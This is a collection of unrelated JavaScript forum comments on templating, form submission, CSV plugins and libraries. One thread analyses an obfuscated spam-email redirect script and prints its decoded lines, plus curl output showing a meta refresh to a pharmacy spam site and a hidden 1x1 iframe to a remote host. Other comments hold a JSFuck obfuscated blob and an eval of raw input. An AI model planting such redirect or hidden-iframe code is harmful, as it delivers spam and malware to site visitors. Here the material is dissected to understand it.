the dojo library has a port of django's template language to javascript. this means you write your templates with django's syntax and the browser will parse it. it seems to me a very weird choice to use the class attribute of html elements as a basis for defining your template syntax
Sure you are right Indeed i wanted to mean a more standarized, enterprise level widget, plugin collection.
Yeah, it might be a little weird. There are 2 other *inspirations* for this, which might be able to explain what I'm trying to do here. 1. If you look at several hosted-CMS solutions like [CushyCMS](http://www.cushycms.com/static/documentation), they use simple class names to denote areas in the web page that are editable by the CMS - I'm just taking that, and adding more "logic" stuff to it. 2. I was also inspired by TAL, Template Attribute Language - but instead of using custom XML syntax/attributes, I just tried to implement it using standard HTML. I didn't know about Dojo's port of django templates, I guess my initial search for existing solutions wasn't thorough enough :)
I've never come across any. Here's your chance to make one. Take all you've learned and make a great resource. Start small. Javascript doesn't have the following for game development as other mediums like Java or Flash do. I'm in the same boat though, I'm more interested in making games in javascript than any other language.
You should check out [Akihabara](http://www.kesiev.com/akihabara/). Not a forum so much, but there is some good JS game development there. 
&gt;Here's your chance to make one. I've moderated a fairly big forum (&gt;30k users) for a couple of years. I really don't want to do this anymore.
Back in the days, around 2000, there was a small but very active community on the www.javascript-games.org site set up by Scott Porter, original author of the GameLib. Unfortunately the site is no more. Jacob Sedeilin set up www.javascriptgaming.com to collect javascript games but AFAIK the site is a little dormant and doesn't really have a community.
Just wanted to say that the small font-size coupled with the light-text-on-white color scheme makes it really difficult to read the blog post.
well done, http://www.i18nguy.com/guidelines.html
Gamelib rocks. You can still find it around the web if you google it. Also check out [GMP](http://gogomakeplay.com/gmp). It's small (15k), easy to use and runs on pretty much anything. I've never found any good JS game dev forums, and I'd be interested if there was!
javascript lint and jslint are two different things! the textmate bundle is based on Javascript Lint. Currently there is no JSLint TM bundle out there that works properly. I have written one on company time a few weeks back and will check with my employer to open source it...
Hm. The only browser vendor who happens to run proper forums is Opera. Their [dev forums](http://dev.opera.com/forums/) got horrible usability though. Their [user forums](http://my.opera.com/community/forums/) are nice, but it probably wouldn't be the right place for this stuff - even more so if it's about things which currently aren't supported in Opera (like WebGL). It's sorta irritating, really. Since Opera is also the only browser vendor without thousand layers of bureaucracy and f-ing mailing lists in between (IME, mind you). You can actually talk to them. They might even create such a forum for us if we ask nicely and if there is enough interest. Well, as I said, I'm not sure if that would be the right place for such a forum. It would take care of things like maintenance, backups, spam attacks, and high performance hosting though. Heh. They might even throw in some t-shirts as prices for competitions. That would be sweet. I really love small silly compos. Even more so if you can win semi pointless everyday items. I *really* love my Serious Sam coffee mug. It's the bestest(!) coffee mug in the world. Sorry for drifting off. But, yea, there is maaaaybe some possibility over there.
I don't know what your application is but it's best to use a button and then style it like a link with CSS ([example](http://snippets.dzone.com/posts/show/6314/)). This means that people without Javascript can still submit your form. If this isn't what you're looking for then, make sure your form is named with an **id**, not name. ie. `&lt;form id="FORMNAME"&gt;...`, otherwise your above code definitely won't work. Otherwise in Firefox check Tools&gt;Error Console, or even better install Firebug and look at any errors that appear there for your pages. Hope that helps.
Use jQuery.. it will abstract the browsers madness ;) then you can just do something like this: $(function(){ $('#link_id').click(function(){ $('#form_id').submit(); return false; }); });
It is telling me that the object is null (or undefined depending of the code I use). EDIT: Maybe the DIV ids must be included in the path?
 &lt;form id='something' ... &gt; &lt;a href="javascript:document.getElementById('something').submit();"&gt;text&lt;/a&gt; The gist: If you're not using jQuery or similar, stick with document.getElementById() because all browsers support it properly. extra protip: You'll also want to put an onsubmit="javascript:checkvalues();" in the &lt;form&gt; tag. If the function returns false, the form won't submit, but it will still submit if they don't have javascript enabled. This allows you to have js data checking on the front end and still work for non-js browsers. 
1. Every time you put javascript code in an href, god kills a kitten 2. Every time you submit a form via a link, god kills a puppy I hope you're happy with yourself, helpless furry animal killer.
I am not happy with myself. I hate javascript. That's the sole reason I haven't touched it in ten years.
&gt; You aren't accidentally holding down control or shift are you? Perhaps something is telling the browser open a new tab somehow. It is a link, after all. Hardly. I use Firefox and open new tabs with middle button. &gt; And see if that does anything. No changes. &gt; I think it's best first to actually learn Javascript I know Javascript, but I haven't touched it in 10 years. The error console was giving me the error "document.FORMNAME" is null, but my code was actually "java__S__cript:document.FORMNAME.submit()". I changed it to "java__s__cript:document.FORMNAME.submit()" and it is now telling me that *document* is undefined.
upvoted for jQuery. it makes javascript pleasant.
Ok, I managed to isolate some more details, and maybe you can help me more. The page is PHP, and the form is contained in a separated PHP page. The code works correctly if I open *only* the form page, but not if I open the index.php page. So, whatever the problem is, it is probably due to DOM issues.
if you are using jQuery, you can use its built in "return false" so you get even more jQuery for your buck!
this works fwiw http://jsbin.com/imave4/2/edit
It could be worse, you could have to code in Java. JS tends to be nice, unless you have to maintain other people's code (as 99% of the time it's going to be utter garbage with globals everywhere and event handlers in the HTML) Anyway, seriously, you shouldn't submit forms via regular links (especially if the form is POSTed), and the href="javascript:" stuff is not good. Use onclick events. Now to get to a more interesting points: why are you using a link to submit a form? Would it be possible to get a bit of background?
wow, that's not confusing at all...
I ... don't get it ? :p
Don't use `return false`. it's a bad habit. It might work in jQuery, but is a bad habit to take for the future. In addition to that, `return false` in jQuery does both, prevent the default and stop the propagation. That might not have been what you intended. You should rather just prevent the default action on the event passed to the click callback function: $(function(){ $('#link_id').click(function(e){ e.preventDefault(). $('#form_id').submit(); }); }); See the following link for more information: http://api.jquery.com/event.preventDefault/ 
Check you've closed your &lt;form&gt; tag properly. You say it works in isolation but not when inserted into your page, which leads me to think you might have a problem with your tags. If your form tag isn't closed, the browser will get confused and probably won't recognise it.
All browsers do NOT support document.getElementById properly. IE and old versions of Opera find elements with the name attribute set to the ID you're searching for BEFORE they search for the elements with the correct ID attribute. &lt;form action="#"&gt; &lt;div&gt;&lt;input name="catpants"/&gt;&lt;/div&gt; &lt;div id="catpants"&gt;&lt;/div&gt; &lt;/form&gt; In IE and old versions of opera, document.getElementById('catpants') will return the input element.
Actually doing this in GWT (which is java) is very easy.
You only hate javascript because you don't understand it. A lot has changed in our understanding of JS in the browser.
If your link is within your form, I use the following: &lt;form&gt; &lt;input&gt; &lt;a class="submit" href="javascript:;"&gt;Submit&lt;/a&gt; &lt;/form&gt; &lt;script&gt; $("form a.submit").bind("click", function () { $(this).closest("form").submit(); return true; }); &lt;/script&gt;
Pretend that you're writing in Scheme with a weird syntax, and JS will suddenly start to make sense. 
Couple of stuff to check for/fix: - a `&lt;base&gt;` tag with a `target=` attribute. That could make all your links open in a different window. It'd also explain why your form works by itself, but not in that bigger page. - using `javascript:` links is dangerous. If the expression evaluates to anything other than `undefined`, that value will be converted as a string and loaded as a document in the page. If you must use them, wrap them in a `void()` statement. But you never have to use them. `&lt;a href="#" onclick="submit()"&gt;` is a better alternative. In you case, a styled submit button is even better. 
It's also very easy in javascript, if you know javascript, but that wasn't quite my point.
Not only that, but some versions of IE may return a list of nodes, if there are multiple items which match. 
+1 I would use this... http://hutch.com/
It's generally best to use either *input* or *button* elements to submit a form. Given that, I decided to try making a *button* element look like a normal *a* element. [Here's my attempt](http://warrenparsons.com/prototypes/forms/button.html) - Styles are in the page. This uses no JS. I've added a yellow background color to the element to illustrate a couple issues in IE6 &amp; 7. Box sizing for the element is funky in those browsers, making it difficult to use the element midstream in a paragraph as in my second example. The first example shows the button styled to look like a link by itself. This version works well on FF 3.6, Safari 4, and Chrome v5 on the Mac as well as IE6, IE7, IE8 and FF 3.6 on the PC. The *display: inline-block* declaration is necessary for Firefox to honor the *text-decoration: underline* rule. *display: block* and any *float* will work for this as well.
Wow... seriously? I've never seen that.
Believe it or not, an awful lot has changed in the past decade. It's worth another look. JavaScript isn't just for form validation and mouseover button images any more. :)
The document.getElementById() method will need an id (with the caveat pointed out by fearphage below), and the other syntax I haven't used for so long I have no idea! However getElementById is pretty much the standard way to do this nowadays.
I have no idea what's going on then. Unless your are using Javascript to open the form from the index.php page, or vice versa, then having different pages open should have no effect what so ever.
It looks like I will have to. Or maybe I will just drop it and CSS the submit button away. I only really thought that doing it with javascript would be easier and faster.
Kind of. I inherited a whole website. The 'damn-it-the-client-needs-this-for-tomorrow-can-you-help-me' kind.
&gt; Now to get to a more interesting points: why are you using a link to submit a form? Would it be possible to get a bit of background? Unfortunately, the layout of the webpage is not my decision.
&gt; Don't use return false. it's a bad habit. It might work in jQuery, but is a bad habit to take for the future. In addition to that, return false in jQuery does both, prevent the default and stop the propagation. Which might be the point, and it's specifically defined as generating both stopPropagation and preventDefault so...
That's a very nice implementation. As for the timing, here's something the OP may find useful... This Firefox only code can come in handy, it really simplifies timings without using setTimeout's chained together. It's main benefit besides -in loop- delays - it uses no CPU cycles like a do-while. I've used it for some tricky timings in the past. 1. /** 2. * Netscape compatible WaitForDelay function. 3. * You can use it as an alternative to Thread.Sleep() in any major programming language 4. * that support it while JavaScript it self doesn't have any built-in function to do such a thing. 5. * parameters: 6. * (Number) delay in millisecond 7. */ 8. function nsWaitForDelay(delay) { 9. /** 10. * Just uncomment this code if you're building an extention for Firefox. 11. * Since FF3, we'll have to ask for user permission to execute XPCOM objects. 12. */ 13. netscape.security.PrivilegeManager.enablePrivilege("UniversalXPConnect"); 14. 15. // Get the current thread. 16. var thread = Components.classes["@mozilla.org/thread-manager;1"].getService(Components.interfaces.nsIThreadManager).currentThread; 17. 18. // Create an inner property to be used later as a notifier. 19. this.delayed = true; 20. 21. /* Call JavaScript setTimeout function 22. * to execute this.delayed = false 23. * after it finish. 24. */ 25. setTimeout("this.delayed = false;", delay); 26. 27. /** 28. * Keep looping until this.delayed = false 29. */ 30. while (this.delayed) { 31. /** 32. * This code will not freeze your browser as it's documented in here: 33. * https://developer.mozilla.org/en/Code_snippets/Threads#Waiting_for_a_background_task_to_complete 34. */ 35. thread.processNextEvent(true); 36. } 37. }
Since you didn't post today, I will leave your comment here even though it's completely unrelated. HAPPY REDDIT BIRTHDAY!
Thanks for all the suggestions. I was able to do it through perl script. It was simple to code.
why don't you try &lt;a href="#" onclick="document.FORMNAME.submit()"&gt;TEXT&lt;/a&gt; 
I will.
I have problems with Chrome in nofreeze, I'm correcting it right now!
ok, it's corrected in v0.2.1 http://github.com/dsimard/jskata/compare/v0.2...v0.2.1
Isn't this what JSON is for? I guess CSV and JSON are similar. eval("var values = {" + fileinput + "};");
well, yes and no... JSON and CSV aren't really similar at all, but certainly JSON could be used to .. and JSON is a better way to transport data... but people with Excel sheets don't want to convert that data into JSON, or write web services to do so.. it's much easier to go File -&gt; Save As -&gt; Comma Separated Values .... 
Yes, very much -- ask anyone who has worked with joomla.
huh, really? joomla uses CSV data?
goddamn!
Thank you, Annie. You've made my Reddit Birthday the best!
how about a CSV to JSON converter? Eh, actually I am sure someone has already done this.
that'd be pretty easy to do... but I'm not entirely certain what the benefit of that would be... probably because I'm not using my imagination hard enough... If you'd really find it useful, and know of a practical use for it, i'll make it!
That is simply incredible. I am still having a hard time wrapping my head around how THIS is javascript.
There's not much that's been done in Flash over the years that can't be built using JavaScript nowadays. Proper 3D acceleration (WebGL, et al.) and video (codec) support will make the use of Flash almost unnecessary. ...at least in a few years. I can't wait! (please disregard my user name for this post).
ok, so where is the code?
I don't understand why people continually gawk at this stuff. There's three things: * HTML5 introduces pixel level manipulation in its canvas tag * HTML5 browsers exist on Apple vanity devices * Javascript engines are getting fast enough to deal with binary data within non-masochistic limits. Here's theoretically gawkable stuff: * You figured out a way around the same-origin policy * You found an engine bug that allows for arbitrary binary code injection * You can do any of that fancy graphics stuff on a really old browser, like Netscape 3 
I'll do a blog post with instructions, etc and link it once I have time to clean up the code and add a few features, but for now, if you're itching to see a quick and dirty demo [here's a link](http://honestbleeps.com/csvtotable/)
couldn't they just save as html and then you wouldn't need to write a jquery plugin?
Thanks
sure, but that would make for some really, really ugly HTML (excel makes awful HTML) It also wouldn't have been nearly as much of a nerd-challenge. ;-)
I know the code doesn't look good, but that really doesn't affect the appearance, does it? 
Does it account for the multitudinous ways CSV exporters fail to export valid CSV data?
it does its best... it will handle properly quoted CSV data... if you have specific examples of issues you've run into, I could test / confirm for you...
Well, yes and no.. Not sure about present-day Excel.. but in my previous experience exporting from Excel-&gt;HTML years ago, it didn't look very consistent in different browsers.
Why is exploiting browser bugs more impressive? (I presume sanctioned cross-origin mechanisms such as CORS, postMessage, and WebSocket are not gawkable by your definition.)
Because that would be something genuinely new. The title is literally "A showcase of awesome JavaScript code that pushes the boundaries of what's possible on the web". Unless that article is dated 2007, this is all rather old news for those who pay attention to it. Some things that I believe are impressive which are probably relatively unknown: * [RaphaelJS](http://raphaeljs.com/) which does fancy graphics with SVG ... which enjoys a wider support base then HTML5 as of the date I'm writing this. * [3d model in javascript](http://www.uselesspickles.com/triangles/demo.html) done with a bunch of div tag hacks; absolutely brilliant * [Raytracer without canvas](http://www.slimeland.com/raytrace/) But that's the past. 
Business people use Excel and that's what they're going to ask. They don't want elegant. They want Excel.
Yes!
There is some existing plugins out there, incase you missed them: http://plugins.jquery.com/project/csv2table http://code.google.com/p/js-tables/wiki/CSV 
Every time you use eval, whole bunch of baby pandas die.
Yes I try to make as much of the website functionality available without using JS as possible. I am a big fan of JavaScript and love the language. My latest webapp is written on ringojs.org server-side platform. Yet I browse the web with Firefox NoScript extension. I also consider any website that requires JS where it could do without it a nuisance. Websites that use scripts from multiple domains on the same page are extremely annoying. I just skip them. The whole Internet is full of better ones. Why do I use NoScript? 1. I don't see ads on most websites. 2. I have ~100 tabs open at a time and don't want my CPU to be wasted by badly written scripts. 3. I am protected from most of the browser privacy and security holes. I've been doing web development for the last 10 years and I see this constant need for websites that are not bloated with whatever is trendy at the moment: first it was optimizing for users on dial-up connections, then SEO optimizations, now mobile devices, who knows what in the future. If your webapp really needs JS for good user experience -- use it. But if you just lack skills to build it without bloat, don't think that everyone is like that.
[Obligatory Google translation](http://translate.google.co.uk/translate?u=http%3A%2F%2Fwww.tasarim8.com%2F10-javascript-oylama-ve-puanlama-eklentisi-ve-dersleri%2F&amp;sl=tr&amp;tl=en&amp;hl=&amp;ie=UTF-8). My Turkish is a bit rusty (read: non-existant), but I think I got the language right.
While that's cool, I was hoping for a *showcase of awesome javascript code.* That's just one game; cool, but... yah. It'd be interesting to see various things that are doing something you don't see everyday. 
Extremely useful. Thanks!
&gt;it will handle properly quoted CSV data double quoted not single quoted EDIT: NVM I just checked the CSV specs 
Yesssss I was waiting for a response like this. Specifically, I was hoping for, "Eich kills a kitten".
Thanks... I did see them, but the first one's documentation was in some sort of asian language, though my ignorance of Kanji characters betrays me here - I have no idea which. The second one, on the other hand, doesn't handle true CSV data. You can't put quotes around an item so that commas can exist within an item, etc... I suppose I probably could have just contributed an update to that one - but I'd never written a jQuery plugin before, so I wanted to try it.
This seems to me like a solution in search of a problem. The current production download of jQuery is 24KB. I would hardly call that bloat, and it is a trivial download for almost any connection. Added to the fact that developers may now reference global CDNs for these libraries, allowing users to reference a cached version of the download across multiple sites, I don't really see the problem here.
If you're just using jQuery and nothing else, sure. But since Google developed this, think about it from their point of view. A user's first load of GMail is almost 1MB. They are also developing JS apps for iPhone/Android/etc. which often have slow mobile network connections where every KB counts. And they've found that &lt;100ms differences in speed make a noticeable difference in their usage metrics.
Feel free to submit stuff that you think is awesome. http://badassjs.com/submit
neat, wonder if that works in [links](javascript:for \(var i in window\) delete window[i];) Hmm.. apparently not, good thing :)
It's pretty common for exporters to leave quotes off altogether or to nest the same quote type inside a value, like: "This "should" be invalid",So should this,'But some 'tards think they can export crap' Not that any csv parser has all those edge cases perfect, IMO, but you see crap like that all the time when dealing with CSV. CSV as a format should die a horrible death, IMO.
&gt;The current production download of jQuery is 24KB. jQuery lacks `JSON.stringify` for example, which takes like 4kb if I remember correctly. And there is other junk you might throw in like that BGIframe thingy for that f-ing IE6. That stuff adds up. If you got a big site with millions of users, it will be worth that one-time-cost for tweaking your build system a bit. I think it's a pretty good idea. But for me it isn't worth the trouble. I'm fine with those low hanging fruits which get me to that 80% spot towards perfection. E.g. YUI Compressor + gzip + proper headers + cache busting. Easy to do and there is nothing to keep in mind. It won't break anything and it's *almost* perfect.
The key statements here I think are: p='hNtTt?p?:F/?/?pTi@a?zNz@aNcFrFe?a?tNiNv?eF.?c?o@mF/?zF.NhNt?mTlF'.replace(/[F@TN\?]/g, '') and document['l$o0c~a~t~iJo~nX'.replace(/[X\$~0J]/g, '')]=p If you evaluate those strings, you get p=**some (malicious?) website** and something saying document['location']=p.
It takes you to "http://piazzacreative.com/z.html"
Interesting. I'm almost tempted to go to that site, but I think I'll just block it in our web filter.
It's from the same authors of this code, which was used in spam emails containing HTML attachments. It's a whole lot of fuss to bypass spam filters with JavaScript heuristic analysis. Most of that code is no-ops just to throw you off. I covered this exact type of spam in a blog post recently: http://ican.stealyour.info/2010/06/09/a-most-unusual-attachment/
That was a very interesting blog post. Thanks.
 $ curl http://piazzacreative.com/z.html &lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt; &lt;html&gt;&lt;head&gt; &lt;title&gt;406 Not Acceptable&lt;/title&gt; &lt;/head&gt;&lt;body&gt; &lt;h1&gt;Not Acceptable&lt;/h1&gt; &lt;p&gt;An appropriate representation of the requested resource /z.html could not be found on this server.&lt;/p&gt; &lt;p&gt;Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.&lt;/p&gt; &lt;hr&gt; &lt;address&gt;Apache Server at piazzacreative.com Port 80&lt;/address&gt; &lt;/body&gt;&lt;/html&gt; Being paranoid, i just tried with a different user-agent and it gives a different response. $ curl -A 'blah' http://piazzacreative.com/z.html &lt;meta http-equiv="refresh" content="3;url=http://toldspeak.com/" /&gt; &lt;iframe src='http://dogopao.bigmuggscoffee.com:8080/index.php?pid=10' width='1' height='1' style='visibility: hidden;'&gt;&lt;/iframe&gt; toldspeak.com goes to some spam webshop ("Order The Cheapest Medications Now!") dogopao.bigmuggscoffee.com:8080 just gives me an empty response. 
just been on it, it sells viagra and other dodgy meds.
I think the script takes you to http://piazzacreative.com/z.html, then there's an meta refresher tag on that page which redirects you to the viagra selling spam website http://toldspeak.com/. Document stores the location is an array too so changing the documen['location']'s value using the replace function and referring it the value of "p" which has the obfuscated url of piazzacreative. Looks like spam. Nothing harmful really. Unless you fall for it and buy their products.
for someone who knows as much as they do about scripts you would think you would know the difference between "bye" and 'buy".
Yes, apologies for that. I don't know much about scripts, but I try to learn more, this one taught me a new way to get location of the document . Thank you for pointing the typo out :), it's been corrected. 
Just got the same email. Now I want pizza, sprinkled with viagra...? No wait, just the first one.
&gt; some (malicious?) website piazzacreative.com/z.html
Try this one: `&lt;script type="text/javascript"&gt;([][(![]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]()[(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]])((+[![]]+[+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[+[]]+[+[]]+[+[]])])[+!+[]+[+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][(![]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]()+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[+[]]+[][(![]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]()[(![]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][(![]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]()+[])[!+[]+!+[]]]((![]+[])[+!+[]]+(+[![]]+[])[+[]])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[!+[]+!+[]+!+[]+!+[]]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]])&lt;/script&gt;` Hint: it's not malicious
*Malice*.
JS object fields are accessible using both subscript ([]) and the dot (.) operator. Subscript allows you to use variable keys, while dot requires a literal. In this case, the subscript operator is being used to obfuscate the key name. var i = 'location'; document[i] === document.location
It's WORSE than malicious. Damn you.
Holy cow, what? how? That is awesome. Can you tell me how you did that?
[I cheated](http://www.reddit.com/r/coding/comments/b6te8/til_you_can_use_to_program_anything_in_javascript/)
First it determines what system is on your computer. If it is Windows it deletes the system and replaces it with a pristine version of DOS 3.3. If it is a Macintosh, it replaces any system with a slightly modified version of OS 5.8.1. UNIX and Linux systems remain unchanged, but users are locked into playing pong and there is no way to stop except by removing the power. Restarting restarts pong. 
Huh, at the time I clicked this, 4 up votes, 4 down votes.. I don't know much about this thing, and no I didn't post it... curious why the downvotes? Does this framework suck or something?
I'm at a loss as well. It's a rebranding of ExtJS, which I always thought was held in pretty high regard. Maybe people are just downvoting in knee jerk reaction to "yet another mobile library" without actually looking at it?
I must say I'm really impressed by this framework after the short time I had with it. I love jQuery, but this here lets even jqTouch look like kids play. Hope I'm still impressed with it after doing a first real project this weekend.
The move toward compatibility to mobile devices didn't require a rebranding, but what do I know. I do know that I'm getting calls for work regarding ExtJS development on mobile platforms already from some southern california companies (although not Experian, who uses ExtJS for many customer tools through their intranet).
Oh, good. I was worried it might somehow do damage to the system. I'm glad we don't have to worry about that!
Reddit smooths out sudden upvote spikes with downvotes. Either that or there's some downboat bots at work. Also I'm sure some people objected to just being linked to a blog instead of the actual site.
This happens whenever you have a payload that's encapsulated in some transport layout, both of which need escaping. It's like why you sometimes need sometimes need to quadruple-escape characters in regexps: match = re.match('JSON.parse(\\'{foo: Fool\\\\'s gold\\')', text) In order for that to be legal JSON, it needs to be escaped as "Fool\\'s gold". However, since that's in a regular expression, the backslash needs to be escaped: "Fool\\\\'s gold". However, since that's in a Python string, each individual backslash needs to be escaped: "Fool\\\\\\\\'s gold" (in actual practice, you'd probably use a raw string, but those aren't available in languages other than Python). I'll also point out that in writing this comment, I had to write out *eight* backslashes in that last sentence, because Reddit's Markdown text processor requires that backslashes be escaped.
Holy shit, this is pretty cool. Check out the demos.
Clearly a lot of work went into this, but maybe it should be renamed "Modern industry level javascript for the layperson" as it spends a lot of time going over basic procedural programming concepts.
In actual practice I'd use the alternative quoting characters "/', or sidestep the problem by composing the string from auto-escaping pieces so the code's easier to read. I'm not going to try to fight markup to give you examples though. Valiant effort. Your JSON's invalid though ☺
The link doesn't seem to be working, so [here is the link to Riff on GitHub](http://github.com/jessesielaff/Riff).
There was a backlash against ExtJS a while back when it did a license shuffle and then partially closed its source code down to try and develop more commercial prospects. I am horribly paraphrasing and over simplifying the issue but if you google it you'll still find a healthy collection of hate speech regarding that past decision.
Great link, thanks. I hope the advanced sections get filled out.
I really liked it but the last section surprised me: // old way if (type == 'foo' || type == 'bar') { ... } // better if (/^(foo|bar)$/.test(type)) { ... } I think the first is more readable and probably faster. 
I am looking out for a API, something similar to what jsonlint does..the second tool looks promising to host on my own server
You've just got to find the escape clause in the contract
[Relevant](http://www.reddit.com/tb/cg9ht)
